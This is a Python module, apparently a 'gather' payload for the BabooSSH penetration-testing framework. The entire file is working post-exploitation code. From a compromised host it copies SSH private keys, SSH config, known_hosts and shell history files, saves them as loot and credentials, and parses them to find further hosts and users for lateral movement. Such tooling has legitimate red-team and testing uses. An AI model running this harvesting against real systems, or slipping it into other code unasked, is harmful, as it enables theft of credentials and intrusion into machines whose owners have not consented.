import getpass
import sys
import os
import re
import glob
import ipaddress
import json
import subprocess
from baboossh.endpoint import Endpoint
from baboossh.user import User
from baboossh.path import Path
from baboossh.creds import Creds
from baboossh.exceptions import ConnectionClosedError

class ExtStr(type):
    def __str__(self):
        return self.getKey()

class BaboosshExt(object,metaclass=ExtStr):

    def __init__(self, connection, wspaceFolder):
        self.connection = connection
        self.wspaceFolder = wspaceFolder
        self.newCreds = []
        self.newUsers = []
        self.newEndpoints = []

        self.keysHash = {}
        for c in Creds.find_all():
            if c.creds_type != "privkey":
                continue
            path = c.obj.keypath
            p = subprocess.run(["sha1sum",path], stdout=subprocess.PIPE)
            out = p.stdout.decode("utf-8")
            h = out.split(" ",1)[0]
            self.keysHash[h] = path


    @classmethod
    def getModType(cls):
        return "payload"

    @classmethod
    def getKey(cls):
        return "gather"

    @classmethod
    def descr(cls):
        return "Gather endpoints and creds from compromised target"
    
    @classmethod
    def buildParser(cls,parser):
        pass

    @classmethod
    def run(cls, connection, wspaceFolder, stmt):
        if connection.conn is None:
            raise ConnectionClosedError
        g = cls(connection, wspaceFolder)
        try:
            g.gather()
        except Exception as e:
            print("Error : "+str(e))
            return False
        return True
    
    def gather(self):
        print("Starting gathering...")
        sys.stdout.flush()

        print("From SSH user config")
        self.gatherFromConfig()
        print("From history files")
        historyFiles = self.listHistoryFiles()
        for historyFile in historyFiles:
            print("\t -"+historyFile)
            self.gatherFromHistory(historyFile)
        print("From user keys")
        self.gatherKeys()
        print("From known_hosts")
        self.gatherFromKnown()
        print("Done !")
        print("Users :")
        for user in self.newUsers:
            print(" - "+str(user))
        print("\nCreds :")
        for creds in self.newCreds:
            print(" - "+str(creds))
        print("\nEndpoints :")
        for endpoint in self.newEndpoints:
            print(" - "+str(endpoint))

    def hostnameToIP(self,hostname,port=None):
        endpoints = []
        #Check if hostname is IP or Hostname :
        try:
            ipobj = ipaddress.ip_address(hostname)
        except ValueError:
            res = self.connection.conn.run("getent hosts "+hostname+" | awk '{ print $1 }'", hide="both", warn=True)
            ips = res.stdout.splitlines()
            for ip in ips:
                ipobj = ipaddress.ip_address(ip)
                if ipobj.is_loopback:
                    continue
                endpoint = Endpoint(ip,port if port is not None else 22)
                if endpoint.id is None:
                    endpoint.found = self.connection.endpoint
                if not self.connection.scope:
                    endpoint.scope = False
                try:
                    path = Path(self.connection.endpoint.host,endpoint)
                except ValueError:
                    pass
                else:
                    endpoint.save()
                    path.save()
                    endpoints.append(endpoint)
        else:
            if ipobj.is_loopback:
                return []
            endpoint = Endpoint(hostname,port if port is not None else 22)
            if endpoint.id is None:
                endpoint.found = self.connection.endpoint
            if not self.connection.scope:
                endpoint.scope = False
            if endpoint.id is None:
                endpoint.save()
                self.newEndpoints.append(endpoint)
            try:
                path = Path(self.connection.endpoint.host,endpoint)
            except ValueError:
                pass
            else:
                path.save()
                endpoints.append(endpoint)
        return endpoints

    def gatherFromConfig(self):
        lootFolder = os.path.join(self.wspaceFolder,"loot")
        filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_.ssh_config"
        filepath = os.path.join(lootFolder,filename)
        try:
            self.connection.conn.get(".ssh/config",filepath)
        except Exception as e:
            return None
        with open(filepath,'r',errors='replace') as f:
            data = f.read()
        lines = data.split('\n')
        curHost = None
        for line in lines:
            if line == '':
                continue
            if line[:5].lower() == "Host ".lower():
                if curHost != None and curHost["name"] != "*":
                    if "host" in curHost.keys():
                        host = curHost["host"]
                    else:
                        host = curHost["name"]
                    if "port" in curHost.keys():
                        port = curHost["port"]
                    else:
                        port=None
                    endpoints = self.hostnameToIP(host,port)
                    user = None
                    identity = None
                    if "user" in curHost.keys():
                        user = User(curHost["user"])
                        if not self.connection.scope:
                            user.scope = False
                        if user.id is None:
                            user.found = self.connection.endpoint
                            user.save()
                            self.newUsers.append(user)
                    if "identity" in curHost.keys():
                        identity = self.getKeyToCreds(curHost["identity"],".")
                curHost = {}
                curHost["name"] = line.split()[1]
            else:
                [key,val] = line.strip().split(' ',1)
                key = key.lower()
                if key == "user":
                    curHost['user'] = val
                elif key == "port":
                    curHost['port'] = val
                elif key == "hostname":
                    curHost['host'] = val
                elif key == "identityfile":
                    if val[:2] == '~/':
                        val = val[2:]
                    curHost['identity'] = val
        if curHost != None and curHost["name"] != "*":
            if "host" in curHost.keys():
                host = curHost["host"]
            else:
                host = curHost["name"]
            if "port" in curHost.keys():
                port = curHost["port"]
            else:
                port=None
            endpoints = self.hostnameToIP(host,port)
            user = None
            identity = None
            if "user" in curHost.keys():
                user = User(curHost["user"])
                if not self.connection.scope:
                    user.scope = False
                if user.id is None:
                    user.found = self.connection.endpoint
                    self.newUsers.append(user)
                    user.save()
            if "identity" in curHost.keys():
                identity = self.getKeyToCreds(curHost["identity"],".")

    def gatherFromKnown(self):
        lootFolder = os.path.join(self.wspaceFolder,"loot")
        filename = str(self.connection.endpoint).replace(':','-')+"_"+str(self.connection.user)+"_.ssh_known_hosts"
        filepath = os.path.join(lootFolder,filename)
        try:
            self.connection.conn.get(".ssh/known_hosts",filepath)
        except Exception as e:
            return None
        with open(filepath,'r',errors='replace') as f:
            data = f.read()
        lines = data.split('\n')
        for line in lines:
            if "|" in line:
                #The entry is hashed, and should be ignored
                continue
            targets = line.partition(' ')[0]
            for target in targets.split(','):
                self.hostnameToIP(target)
        os.remove(filepath)


    def gatherKeys(self):
        files = []
        ret = []
        result = self.connection.conn.run("ls -A .ssh", hide="both", warn=True)
        for line in result.stdout.splitlines():
            if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
                files.append(line)
        for keyfile in files:
            c = self.getKeyToCreds(keyfile)

    def getKeyToCreds(self,keyfile,basePath=".ssh"):
        if basePath != ".":
            keyfile = os.path.join(basePath,keyfile)
        from baboossh.extensions import Extensions
        keysFolder = os.path.join(self.wspaceFolder,"keys")
        filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_"+keyfile.replace("/","_")
        filepath = os.path.join(keysFolder,filename)
        try:
            self.connection.conn.get(keyfile,filepath)
        except Exception as e:
            print(e)
            return None
        subprocess.run(["chmod","600",filepath])
        p = subprocess.run(["sha1sum",filepath], stdout=subprocess.PIPE)
        output = p.stdout.decode("utf-8")
        output = output.split(" ",1)[0]
        if output in self.keysHash.keys():
            if filepath != self.keysHash[output]:
                os.remove(filepath)
            return None
        valid,haspass = Extensions.auths["privkey"].checkKeyfile(filepath)
        if valid:
            self.keysHash[output] = filepath
            c= { "passphrase":"","keypath":filepath,"haspass":haspass}
            cred = Creds("privkey",json.dumps(c))
            if not self.connection.scope:
                cred.scope = False
            if cred.id is None:
                cred.found = self.connection.endpoint
                cred.save()
                self.newCreds.append(cred)
            return cred
        else:
            os.remove(filepath)
        return None

    def listHistoryFiles(self):
        ret = []
        result = self.connection.conn.run("ls -A", hide="both", warn=True)
        for line in result.stdout.splitlines():
            if "history" in line:
                ret.append(line)
        return ret

    def gatherFromHistory(self,historyFile):
        lootFolder = os.path.join(self.wspaceFolder,"loot")
        filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_"+historyFile.replace("/","_")
        filepath = os.path.join(lootFolder,filename)
        try:
            self.connection.conn.get(historyFile,filepath)
        except Exception as e:
            print(e)
            return None
        with open(filepath,"r",errors="ignore") as dledFile:
            data = dledFile.read()
        lines = data.splitlines()
        for line in lines:
            if re.search(r'^ *ssh ',line):
                option = ""
                words = line.split()
                host = False
                port = None
                user = None
                identity = None

                for i in range(1,len(words)):
                    if option != "":
                        if option == "identity":
                            identity = words[i]
                            if identity[:2] == '~/':
                                identity = identity[2:]
                        elif option == "port":
                            port = words[i]
                        option = ""
                    elif words[i][0] == "-":
                        if words[i] == "-i":
                            option = "identity"
                        elif words[i] == "-p":
                            option = "port"
                        else:
                            option = words[i]
                    elif not host:
                        if '@' in words[i]:
                            user,hostname = words[i].split("@",1)
                        else:
                            hostname = words[i]
                        host = True
                if not host:
                    continue
                endpoints = self.hostnameToIP(hostname,port)
                if user is not None:
                    user = User(user)
                    if not self.connection.scope:
                        user.scope = False
                    if user.id is None:
                        user.found = self.connection.endpoint
                        user.save()
                        self.newUsers.append(user)
                if identity is not None:
                    identity = self.getKeyToCreds(identity,".")

